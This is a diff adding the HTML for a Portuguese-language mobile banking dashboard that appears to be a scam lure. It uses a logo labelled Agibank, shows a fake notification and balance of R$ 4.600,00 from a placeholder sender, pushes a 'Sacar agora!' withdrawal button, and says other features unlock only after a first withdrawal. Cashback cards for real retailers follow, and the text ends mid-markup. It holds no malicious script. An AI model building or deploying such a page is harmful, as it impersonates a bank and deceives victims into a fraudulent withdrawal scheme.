@@ -1,0 +1,528 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco App- Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <!-- Notificação -->
+    <div id="notification" class="notification d-none">
+        <div class="notification-content">
+            <div class="notification-time">agora</div>
+            <div class="notification-icon">
+              <img src="images/xlogo.png" alt="Agibank" data-pagespeed-url-hash="1869563532" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+            </div>
+            <div class="notification-text">
+                <div class="notification-title"><span class="marca"></span></div>
+                <div class="notification-message">Você recebeu R$ 4.600,00 de <span class="marca"></span>.</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Alertinha dos botões -->
+    <div class="mini-alert">
+        <div class="mini-alert-content">
+            <i class="bi bi-exclamation-triangle-fill me-2"></i>
+            <span class="mini-alert-text">Realize o primeiro saque para ativar esta função.</span>
+        </div>
+    </div>
+
+    <header class="bg-primary text-white p-3">
+        <div class="container">
+            <div class="d-flex justify-content-between align-items-center">
+                <h5 class="mb-0">Olá, <span id="userName">Usuário</span>!</h5>
+                <img src="images/xlogo.png" alt="Logo" class="logo" width="120" data-pagespeed-url-hash="2474023184" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+            </div>
+        </div>
+    </header>
+
+    <main class="container-fluid p-0 mb-5 pb-5">
+        <div class="container mt-3 mb-3">
+            <div class="card rounded-4 text-white conta-card">
+                <div class="card-body p-3">
+                    <div class="d-flex justify-content-between align-items-center mb-3">
+                        <span class="fw-medium">Conta</span>
+                        <span class="small">Ver extrato &gt;</span>
+                    </div>
+                    
+                    <div class="mt-4">
+                        <div class="small opacity-75">Saldo em conta</div>
+                        <h3 class="fw-bold mb-0" id="balance">R$ 4.600,00</h3>
+                        <div class="small opacity-75 mb-4">rendendo 102% do CDI</div>
+                        
+                        <button class="btn btn-light text-primary fw-medium rounded-pill px-4 w-100">
+                            Sacar agora!
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="container mt-4">
+            <div class="finance-actions-carousel">
+                <div class="row flex-nowrap overflow-auto snap-scroll pb-2">
+
+                    <div class="col-3 col-md-3 text-center">
+                        <div class="card action-icon-card action-item-active mx-auto mb-2" data-mini-alert="false">
+                            <div class="d-flex justify-content-center align-items-center h-100">
+                                <i class="bi bi-cash-coin fs-4"></i>
+                            </div>
+                        </div>
+                        <p class="mb-0 small">Sacar agora!</p>
+                    </div>
+
+                    <div class="col-3 col-md-3 text-center">
+                        <div class="card action-icon-card bg-light mx-auto mb-2">
+                            <div class="d-flex justify-content-center align-items-center h-100">
+                                <i class="fa-brands fa-pix fs-4"></i>
+                            </div>
+                        </div>
+                        <p class="mb-0 small">Pix</p>
+                    </div>
+                    
+                    <div class="col-3 col-md-3 text-center">
+                        <div class="card action-icon-card bg-light mx-auto mb-2">
+                            <div class="d-flex justify-content-center align-items-center h-100">
+                                <i class="bi bi-upc-scan fs-4"></i>
+                            </div>
+                        </div>
+                        <p class="mb-0 small">Pagar Boleto</p>
+                    </div>
+                    
+                    <div class="col-3 col-md-3 text-center">
+                        <div class="card action-icon-card bg-light mx-auto mb-2">
+                            <div class="d-flex justify-content-center align-items-center h-100">
+                                <i class="bi bi-piggy-bank-fill fs-4"></i>
+                            </div>
+                        </div>
+                        <p class="mb-0 small">Cofrinhos</p>
+                    </div>
+                    
+                    <div class="col-3 col-md-3 text-center">
+                        <div class="card action-icon-card bg-light mx-auto mb-2">
+                            <div class="d-flex justify-content-center align-items-center h-100">
+                                <i class="bi bi-people-fill fs-4"></i>
+                            </div>
+                        </div>
+                        <p class="mb-0 small">Pagar pessoas</p>
+                    </div>
+                    
+
+                </div>
+            </div>
+        </div>
+
+        <div class="container mt-2">
+            <div id="carouselPromo" class="carousel slide" data-bs-ride="carousel">
+                <div class="carousel-inner">
+
+                    <div class="carousel-item active">
+                        <div class="promo-card bg-dark text-white" data-mini-alert="true">
+                            <div class="promo-content">
+                                <h4 class="promo-title mb-2">Modo Seguro</h4>
+                                <p class="promo-description">Oculte seus investimentos<br>quando estiver na rua. É grátis!</p>
+                                <span class="promo-link">Saiba Mais &gt;</span>
+                            </div>
+                            <div class="promo-image">
+                                <img src="images/slider-2.webp" alt="Modo Seguro" data-pagespeed-url-hash="3392937706" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="carousel-item">
+                        <div class="promo-card bg-light" data-mini-alert="true">
+                            <div class="promo-content">
+                                <h4 class="promo-title mb-2">Open Finance</h4>
+                                <p class="promo-description">Ative e aproveite <br> ofertas exclusivas para investir</p>
+                                <span class="promo-link">Ativar &gt;</span>
+                            </div>
+                            <div class="promo-image">
+                                <img src="images/slider-1.webp" alt="Open Finance" data-pagespeed-url-hash="3468153719" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                        </div>
+                    </div>
+                                        
+                    <div class="carousel-item">
+                        <div class="promo-card bg-primary text-white" data-mini-alert="true">
+                            <div class="promo-content">
+                                <h4 class="promo-title mb-2">CDB 105% do CDI</h4>
+                                <p class="promo-description">Invista e tenha rentabilidade<br>em 1 ano</p>
+                                <span class="promo-link">Garantir Oferta &gt;</span>
+                            </div>
+                            <div class="promo-image">
+                                <img src="images/slider-3.webp" alt="CDB" data-pagespeed-url-hash="3317721693" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- <button class="carousel-control-prev" type="button" data-bs-target="#carouselPromo" data-bs-slide="prev">
+                    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+                    <span class="visually-hidden">Anterior</span>
+                </button>
+                <button class="carousel-control-next" type="button" data-bs-target="#carouselPromo" data-bs-slide="next">
+                    <span class="carousel-control-next-icon" aria-hidden="true"></span>
+                    <span class="visually-hidden">Próximo</span>
+                </button> -->
+                
+                <div class="carousel-indicators">
+                    <button type="button" data-bs-target="#carouselPromo" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
+                    <button type="button" data-bs-target="#carouselPromo" data-bs-slide-to="1" aria-label="Slide 2"></button>
+                    <button type="button" data-bs-target="#carouselPromo" data-bs-slide-to="2" aria-label="Slide 3"></button>
+                </div>
+            </div>
+        </div>
+
+
+        <div class="container mt-4">
+            <h4 class="mb-3">Promoções e cashback</h4>
+            
+            <div class="cashback-slider">
+                <div class="cashback-scroll">
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="data:image/png;base64,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" class="card-img-top" alt="Renner" data-pagespeed-url-hash="4020540912" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Renner</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="img/cashback/loja-2.png" class="card-img-top" alt="Netshoes" data-pagespeed-url-hash="20073537" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Netshoes</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="data:image/png;base64,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" class="card-img-top" alt="Natura" data-pagespeed-url-hash="314573458" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Natura</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="img/cashback/loja-4.png" class="card-img-top" alt="Casas Bahia" data-pagespeed-url-hash="609073379" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Casas Bahia</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="img/cashback/loja-5.png" class="card-img-top" alt="Madeira Madeira" data-pagespeed-url-hash="903573300" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Madeira Madeira</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="img/cashback/loja-6.png" class="card-img-top" alt="Kabum" data-pagespeed-url-hash="1198073221" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Kabum</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="data:image/png;base64,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" class="card-img-top" alt="Renner" data-pagespeed-url-hash="4020540912" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Renner</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="img/cashback/loja-2.png" class="card-img-top" alt="Netshoes" data-pagespeed-url-hash="20073537" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Netshoes</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
